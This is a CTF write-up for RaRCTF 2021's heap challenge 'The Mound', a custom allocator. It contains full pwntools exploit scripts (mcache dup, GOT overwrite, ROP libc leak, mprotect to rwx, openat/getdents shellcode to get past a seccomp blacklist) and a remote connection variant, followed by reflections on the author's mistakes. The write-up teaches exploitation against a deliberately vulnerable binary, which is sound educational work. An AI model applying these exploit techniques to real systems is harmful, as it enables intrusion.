","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:4:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting to win() Right now, mcache-\u003eentries[1] == [arr[0xf] -\u003e arr[0xf]]. arr[0xf]-\u003enext can be modified to anything, so long as (mcache_entry*)(arr[0xf]-\u003enext)-\u003emcache == mound_arena.mcache. Taking a hint from the the definition, I’ll try to point -\u003enext to mound_arena.mcache-0x10, because it’s the only non-user-controlled region that happens to have an mcache pointer. add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8)) The linked list here is now [arr[0xf] -\u003e mound_arena+0x7ff8]. As a reminder, the mound_arena looks like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 Right after the mcache is the top pointer. Pulling two items off of the mcache linked list will get the top pointer overwritten with user-controllable data: add(0x20, 0xd, 'hi') add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) Here, I’m overwriting mound_data.top with a GOT pointer to gain RIP control: add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf() And now the exploit reaches win(): Simple enough, right? ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:4:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"On the lengths I will go to fool myself: a novel, inferior exploit approach Picture this: it’s the middle of a Saturday afternoon. I’m looking at gdb in one window, and vim in the next. There’s a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays™ decompiler. In short, I’m not really thinking straight. But what I do notice, in my digital stupor, are the comments I have open in Pseudocode-Q3: I had dismissed the immediate relevance of strdup() with the false reasoning I’d demonstrated at the end of this section. I even got to work on rationalizing the apparent irrelevancy of case 1/3; my writeup had these lines at one point: It’s reasonable to assume that strdup() was introduced explicitly as an exploit vector for the challenge, so I can expect that there’s a way to edit mchunk_prev_size without calling free(). On a wild guess, I expect that the final exploit involves modifying sizes[idx] and overflowing into glibc chunk metadata via case 3. Since there’s currently no way to move forward with case 1/3, I’ll shift my focus to the other two cases. The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with mmalloc(0). Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I’d prefer to leave the details available to the public. So, let’s talk about mmalloc(). ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:5:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"mmalloc() and mfree() mmalloc() is only ever called in case 2: case 2: // add if ( user_sz \u003c= 0xFFF ) { // ... omitted ... if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; mmalloc() itself is defined a little oddly: __int64 *mmalloc(int user_sz) { int chunk_sz = request2size(user_sz); if ( chunk_sz \u003c 0 ) // not sure what the purpose of this is chunk_sz = (-user_sz \u0026 0xF) + user_sz + 31; int midx = csize2midx(chunk_sz); if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } If I expand the macros, the bug becomes more obvious: __int64 *mmalloc(int user_sz) { // 0 \u003c= user_sz \u003c= 0xfff int chunk_sz = (-user_sz\u00260xf)+user_sz+0x10; // 0x10 \u003c= chunk_sz \u003c= 0x1010 if ( chunk_sz \u003c 0 ) /* { ... } ignore */ int midx = (chunk_sz\u003e\u003e4)-2; // -1 \u003c= midx \u003c= 0xff if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) // possible negative index here!!! return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } As a reminder, the mcache is structured like this: typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } mcache-\u003eentries[-1] really refers to mcache-\u003ecounts[0x10:0x18]. By filling up the mcache bins for 0x120 \u003c= chunk_sz \u003c 0x1a0, we can get mcache-\u003eentries[-1] to point to any arbitrary location. The subsequent call to mmalloc_alloc(0) has a small safety check, as I showed earlier in the flowchart: __int64 *mcache_alloc(int user_sz) { // user_sz = 0 mcache_struct *mcache_ = mcache; // [rsp+30h] [rbp-10h] int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h] mcache_entry *e = mcache-\u003eentries[midx]; // [rsp+20h] [rbp-20h] mcache-\u003eentries[midx] = (mcache_entry *)e-\u003efd; --mcache_-\u003ecounts[midx]; if ( mcache_ != (mcache_struct *)e-\u003emcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache puts(\"Mcache: Invalid verify\"); exit(1); } e-\u003efd = e-\u003emcache = 0LL; remove_id(e-\u003eid); return \u0026e-\u003emcache; } This effectively means that mcache-\u003eentries[-1] needs to point to a known region of user-controlled data, like the mound. I’ll use this bug to allocate a fake chunk with a valid mcache size. def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(0x20, 0, fake_mcache_entry(0x100)) add(1, 1, b'a') # chunk to be overflowed fake_mcache_addr = 0xbeef0000100 for i,b in enumerate(pack(fake_mcache_addr)): chunk_sz = 0x120+i*0x10 user_sz = chunk_sz - 0x10 # TODO: how to get b \u003e 0xf? for i in range(b): add(user_sz, 0xf-i, b'garbage') for i in range(b): free(0xf-i) add(0, 2, b'') # trigger bug free(0) There’s a TODO in there, and I’ll explain. The problem with incrementing mcache-\u003ecounts[0x10:0x18] one-by-one is that there aren’t enough pointers to go around. By right, if sizeof(arr[]) is only 0x10, the maximum value for mcache-\u003ecounts[] should be 0x10 as well. I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in Fake IDs, and I started work on an odd, roundabout method of achieving much of the same4: # The substance of the exploit: getting mcache-\u003eentries[-1] to point to a fake mchunk for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b): def pad(s: bytes): return s.rjust(0x17, b'a') strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk. strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10) add(midx, 2, b'hi') while (pred := r64bit())\u003e\u003e56: add(midx, 2, b'hi') for _ in range(b): # continually double-free to boost -\u003ecounts[] free(2) edit(0xf, pad(pack(r64())[:7])) free(0xe) edit(0xf, pad(","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:5:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Using win() The seccomp filter for this challenge is mildly interesting. Normally, seccomp’d binaries have a whitelist for permitted syscalls, but in this situation, there’s only a blacklist against a few. The blacklisted items give pause for thought: both execve and open are banned, and normally you’d use the former to pop a shell, and the latter for an open-read-write chain. But before I get ahead of myself, let’s talk about how to get to arbitrary syscalls first. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:6:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Moving to rwx There aren’t a lot of gadgets in the main binary, so it might be better to leak libc first. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all') Once that’s done, I can abuse gadgets in libc to convert the mound_data memory region into an rwx page: R = ROP(context.libc) R.raw(0x48*b'a') R.mprotect(mound_data.base, 0x400000, 7) R.call(mound_data.shellcode) r.sendlineafter(';)\\n', R.chain()) This only makes sense if mound_data.shellcode actually points to an area of user-written shellcode. I handled this by writing shellcode to mound_data using add(), long before the mcache dup happens: # ... everything up until the first few add() calls ... sc = ... # I'm about to cover this part. sc = asm(sc) # don't call asm() twice add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use # ... everything else, e.g. getting mcache dup ... Figuring out what shellcode to run isn’t too difficult, if you have a syscall reference in hand. This challenge shows why you shouldn’t use a seccomp blacklist: open might be banned, but openat certainly isn’t. I’ll start off with some shellcode to open the /pwn/ folder: sc = shellcraft.pushstr('/pwn') sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) sc+= 'mov QWORD PTR [{}], rax\\n'.format(0xbeef0000000) sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory After that, I’ll apply a basic assembly loop to search for .txt: sc+= shellcraft.mov('rax', 0xbeef0010000) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(u32('.txt')) sc+= 'jne loop\\n' # End result: *(int*)rax == u32(\".txt\") Since the flag’s filename is always 0x20+4 bytes long, the beginning of the flag filename will be at rax-0x20 , and I can use openat again to write the flag to stdout: sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(0xbeef0000000) sc+= shellcraft.openat('rax', 'rbx', 0) # i.e. shellcraft.cat('rbx'), but sc+= shellcraft.read('rax', 0xdead0000000, 100) # because pwntools uses SYS_open sc+= shellcraft.write(1, 0xdead0000000, 100) # I have to do this in 3 lines. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:6:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting the flag For reference, this is what the full script should look like at this point: from random import randint from collections import namedtuple from ctypes import CDLL from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here sc = '' # step 1: getting a directory listing sc+= shellcraft.pushstr('/pwn') # put \"/pwn\" on the stack sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr sc+= 'mov QWORD PTR [{}], rax\\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base) sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory # step 2: loop through the dents data to find the flag filename sc+=shellcraft.mov('rax', mound_data.dents) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(hex(u32('.txt'))) sc+= 'jne loop\\n' # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(mound_data.base) sc+= shellcraft.openat('rax', 'rbx', 0) sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN) sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN) sc = asm(sc) # don't call asm() twice add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use # The Obvious Solution: mcache dup --\u003e mound_arena.top overwrite --\u003e GOT table edit to win() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 5) strdup(b'a'*0x17, 6) edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a')) free(midxs.fakeid_provider) edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a')) add(midxs.strdup, 7, b'a'*0x10) for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them. while 1: # try adding until there's an ID with a null MSB add(midxs.mcache_dup, 0xf, b'hi') if not ((chunk_id := r64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) # mcache dup add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite -\u003enext add(midxs.mcache_dup, 0xd, 'hi') add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf'] # win() will execute. Leak libc in the first cycle. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['rea","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:6:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mistakes [Content warning: unsubstantiated opinions] ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:7:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"I. Pwn isn’t RE CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding the heap implementation was written during the 36-hours between me starting this challenge and mound.py spitting out the flag. The assumption I’ve been rolling with, in all of the pwnables do, is that boosting time(reversing binaries) will pay off by a comparable reduction in time(scripting and debugging). That belief didn’t work out for this challenge. At the end of the main() reversing effort, I noted that I observed a few Bad Things going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the mound to understand that sending a glibc pointer to mfree() tends to produce Double free exit(1) calls as a result of a null prev_size. Do you know how else I could’ve discovered that? By just testing out the damn thing and getting a backtrace: gdb.attach(r, gdbscript='b exit\\nc') strdup(b'hi', 0) free(0) r.interactive() Oh, look! It stops in find_id(). Which only stops because *((void*)p-0x10) == NULL for the p in mfree(p). So I should probably find a way to edit prev_size for one of the strdup()’d pointers. Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but The Mound is certainly not one of them. I can’t speak for ptr-yudai, but judging by his long article on adapting fuzzing techniques for CTF pwnables, I expect that there’s a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of eyeballing everything I can in IDA until something sticks. I might re-evaluate this section if someone comes around with a really fast CTF Reversing strategy, but until then: ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:7:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"II. Pattern matching CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape6 after the original design. v8 challenges are a good example of this: Prior to 2018, nothing. This year, there’s already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome’s market share: The IRL relevance of v8 hasn’t changed (much), so what gives? There’s a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might’ve been “Return Oriented Programming”. Go back a few years and you’ll see everyone interested in nifty House of * exploits. In the past few years, there’s been an obsession with things like v8 oobs and printf() one-shots. This is an intentionally broad picture; the trends I’ve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound. Instinctively, I try to pull meta-games using the trends I observe. If it’s a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is a lot harder with contemporary security measures. If there’s a text input, I’ll bash in \"A\"*0x1000 for the sake of it. And if there’s a special number that’ll produce a negative array index — a smaller pattern that I’ve unfortunately internalised — I’ll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there. It was with this bias that I approached The Mound, even after I learnt how to double-free a mound allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing mcache-\u003ecounts[]), but if it follows what I’ve seen before, I have an expectation that things will go the same way. I’ll admit that this is a little bit theoretical, but I would have saved a lot of time if I could’ve just convinced myself to abort with the mcache-\u003eentries[-1] exploit path early on. I’m not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:7:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"III. Things I haven’t considered? I could be doing pwn in sub-optimal ways I can’t identify as sub-optimal on my own. I’m hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster. That’s it. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:7:3","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Footnotes This isn’t particularly useful. There’s no way to leak pointers outside of win(). I tried looking for seeds that would produce repeated cycles: from ctypes import CDLL LIBC = CDLL('libc.so.6') t = LIBC.time(0) t \u0026= 0xffffffffffff0000 for i in range(t,t+0xffff): LIBC.srand(i) seen = set(LIBC.rand() for j in range(0x1000)) if len(seen) \u003c 0xff0: print(i, len(seen)) The script found nothing. In case you’re wondering how there’s a pseudocode reference to mound_arena.mcache-\u003eentries[], as opposed to an ugly red *(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8) reference: Define the mound_metadata class (and the other structs from here) in the Structures tab; you should see an entry like this in the local types tab (Shift+F1): In the IDA View tab, select Edit --\u003e Segments --\u003e Create Segment; fill the pop-up window with sensible values put a variable at mound_arena:00000DEAD0000000 and retype it (Y) as a mound_metadata. The code block there isn’t supposed to make sense. Throughout the writeup, I’ve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a little bit intractable. This is the reason why I ended up searching for the intended solution. My silly alternative method for getting to win() doesn’t work on remote; the time cost associated with a single connection – let alone bruteforcing the PID – makes it impossible to increment mcache-\u003eentries[-1] without an absurdly low ping. The 30x number comes from a crude measure of how many times the exploit calls choose(). For the intended solution, it’s about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes per guess on remote. Feel free to try it out youself: from random import randint from collections import namedtuple from ctypes import CDLL from tqdm import tqdm from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) if args.REMOTE: r = remote('193.57.159.27', 41932) #r = remote('localhost', 8329) libc.srand(t^int(args.PID)) # bruteforce PID else: r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10) mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190) def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakec","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:8:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"An unfinished pwn writeup, wrapped with the airs of regret.","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"If you’re only interested in the technical details for The Mound, I have a minified version of this post on ctfdump. Back in May, I started work on the outlines of a special blogpost. It’s working title was Doing pwn fast: a personal strategy for speedpwning in CTFs, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency – as revolting as it was – wasn’t an immediate concern, and I moved on. Fast forward to now. In the leadup to the 9th of August, I spent my weekend huddled in my house, itching away at RaRCTF’s toughest pwnable: an introductory heap CLI that certain professionals finished within hours: I wasn’t one of those professionals. Have a look at the scoreboard graph for the group of experts I happened to tag along with: Read the graph: Aug 8, 1PM minus Aug 7, 1AM. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I’d invest even more of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right? There’s something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. Could I have done this challenge faster, if I’d went about things differently? Maybe, but that’s not the question I’ll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I’ll be covering in detail here. In the future, I might try to generalise the problems I’ve identified here for a better rendition of Doing pwn fast, but for now: The Mound [800] The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security. Files: mound.zip Archive: mound.zip Length Date Time Name --------- ---------- ----- ---- 18160 2021-08-06 09:14 mound/mound 451 2021-08-06 04:38 ctf.xinetd 566 2021-08-06 17:08 Dockerfile 100 2021-08-06 16:43 setup.sh 25 2021-08-06 04:39 start.sh 22 2021-08-06 17:30 flag.txt 2029224 2021-08-06 17:13 libc.so.6 Relevant details: $ checksec mound/mound [*] '/mound' Arch: amd64-64-little RELRO: Partial RELRO # ! Stack: No canary found # ! NX: NX enabled PIE: No PIE (0x400000) # ! $ seccomp-tools dump mound/mound line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH_X86_64) goto 0014 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0a 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0014 0004: 0x15 0x09 0x00 0x0000003b if (A == execve) goto 0014 0005: 0x15 0x08 0x00 0x00000142 if (A == execveat) goto 0014 0006: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0014 0007: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0014 0008: 0x15 0x05 0x00 0x00000055 if (A == creat) goto 0014 0009: 0x15 0x04 0x00 0x00000086 if (A == uselib) goto 0014 0010: 0x15 0x03 0x00 0x00000039 if (A == fork) goto 0014 0011: 0x15 0x02 0x00 0x0000003a if (A == vfork) goto 0014 0012: 0x15 0x01 0x00 0x00000038 if (A == clone) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL $ ./libc-database/identify libc.so.6 libc6_2.31-0ubuntu9.1_amd64 The seccomp filter is a little bit interesting, but I’ll cover it later on. It’s also worth noting that setup.sh contains this line: $ cat setup.sh #!/bin/sh mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:0:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Working backwards mount has a good number of functions: There’s a function named win; that seems rather important. ssize_t win() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF puts(\"Exploiting BOF is simple right? ;)\"); return read(0, buf, 0x1000uLL); } The binary doesn’t have PIE or stack canaries or RELRO enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:1:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Program outline This is main() (partially prettified): void *arr[16]; // .bss:0x404180 size_t sizes[16]; // .bss:0x404200 int main() { unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); install_seccomp(); puts(\"I am the witch mmalloc\"); puts(\"Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.\"); puts(\"It is, from all of my training, that I have seen the flaws in glibc heap.\"); puts(\"Welcome, fellow pwner, to The Mound\"); moundsetup(); memset(s, 0, 0x100uLL); while ( 1 ) { #define REJECT {puts(\"No.\"); break;} switch ( int opt = menu() ) { case 4: // free printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; case 3: // edit printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; case 2: // add printf(\"Size of pile: \"); __isoc99_scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; default: puts(\"Cya later :p\"); exit(0); } } } That’s pretty long. Let’s break it up into two segments: the preamble, and the while(1) loop. ","date":"9090-08-08","objectID":"/rarctf-2021-the-mound/:2:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Preamble main() doesn’t have a lot of variables. unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF The 3 variables here are user-editable, and we’ll talk about them later. Just keep in mind that user_sz and idx are unsigned integers written to with scanf(\"%d\") calls later on, and s[] is written to with a non-overflowing, non-zero-terminating1 read() call. After this, main() runs a bunch of initialisers: setvbuf(...); // all 3 i/o streams are unbuffered install_seccomp(); // start seccomp filter as shown at the start of this writeup puts(...); // intro message moundsetup(); // setup the \"mound\"; this challenge's heap implementation memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough The only complicated function here is moundsetup(); skip ahead to this part of the writeup if you want to understand it. If not: 